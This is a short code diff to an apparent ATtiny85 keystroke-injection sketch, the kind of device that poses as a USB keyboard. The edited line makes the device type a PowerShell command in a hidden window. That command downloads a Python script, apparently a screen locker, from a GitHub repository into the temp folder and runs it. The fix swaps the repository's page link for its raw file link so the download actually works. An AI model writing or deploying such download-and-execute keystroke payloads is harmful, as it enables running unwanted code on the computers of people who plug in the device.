@@ -29,7 +29,7 @@ void loop() {
     DigiKeyboardFr.delay(500);
 
     // Récupère un script sur internet et l'exécute
-    DigiKeyboardFr.print("powershell -w hidden -Command \"if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/blob/main/BannerScreen/lock.pyw -OutFile $env:TEMP\\s.pyw; python $env:TEMP\\s.pyw }\"");
+    DigiKeyboardFr.print("powershell -w hidden -Command \"if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/raw/main/BannerScreen/lock.pyw -OutFile $env:TEMP\\s.pyw; python $env:TEMP\\s.pyw }\"");
     DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
     DigiKeyboardFr.delay(500);
 
